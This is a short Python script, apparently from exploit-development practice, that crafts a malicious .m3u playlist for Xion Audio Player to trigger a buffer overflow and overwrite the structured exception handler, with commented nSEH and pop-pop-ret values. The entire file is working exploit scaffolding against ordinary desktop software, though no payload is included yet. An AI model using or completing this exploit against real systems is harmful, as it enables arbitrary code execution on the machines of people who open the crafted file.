import struct

total = 5000
fuzz = "A" * 206
#fuzz += "\x41\x41"
#replaced with NOP like instruction
fuzz += "\x61\x62" #overwrite nSEH, \x61 (popad - pop all general purposes registers), \x62 (nop/align)
# pop pop ret = 0x00450015
fuzz += "\x15\x45" #overwrite SEH
fuzz += "D" * (total-206-2-2) 
filename = "C:\Documents and Settings\yunaranyancat\Desktop\XionAudioPlayer\overwritenseh.m3u"

with open(filename, 'w') as outfile:
    outfile.write(fuzz)

